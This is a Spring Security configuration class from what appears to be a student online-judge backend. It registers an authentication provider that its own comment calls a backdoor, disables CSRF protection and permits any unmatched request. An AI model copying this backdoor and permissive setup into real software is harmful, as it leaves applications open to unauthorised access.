package com.sustech.dboj.backend.config;

import com.sustech.dboj.backend.service.MyUserDetailsService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

@EnableWebSecurity
public class SecurityConfiguration extends WebSecurityConfigurerAdapter {
    @Autowired
    BackdoorAuthenticationProvider backdoorAuthenticationProvider;
    @Autowired
    MyUserDetailsService myUserDetailsService;
    @Override
    protected void configure( AuthenticationManagerBuilder auth) throws Exception {
        //将自定义验证类注册进去,加入后门
        auth.authenticationProvider(backdoorAuthenticationProvider);
        //加入数据库验证类，下面的语句实际上在验证链中加入了一个DaoAuthenticationProvider
        auth.userDetailsService(myUserDetailsService).passwordEncoder(new BCryptPasswordEncoder());
    }

    /**
     * 匹配 "/","/index" 路径，不需要权限即可访问
     * 匹配 "/user" 及其以下所有路径，都需要 "USER" 权限
     * 匹配 "/admin" 及其以下所有路径，都需要 "ADMIN" 权限
     * 登录地址为 "/login"，登录成功默认跳转到页面 "/user"
     * 退出登录的地址为 "/logout"，退出成功后跳转到页面 "/login"
     */
    @Override
    protected void configure( HttpSecurity http) throws Exception {
        http
                .authorizeRequests()
                .antMatchers("/","/index","/error","/login","/register").permitAll()
                .antMatchers("/user/**").hasRole("STU")
                .antMatchers("/admin/**").hasAnyRole("TA","SA")
                .anyRequest().permitAll()
                .and().csrf().disable();
//                .antMatchers("/**").hasIpAddress("127.0.0.1")
//                .and()
//                .formLogin().loginPage("/login").defaultSuccessUrl("/user")
//                //1.自定义参数名称，与login.html中的参数对应
//                .usernameParameter("username").passwordParameter("password")
//                .and()
//                .logout().logoutUrl("/logout").logoutSuccessUrl("/login");
    }
}
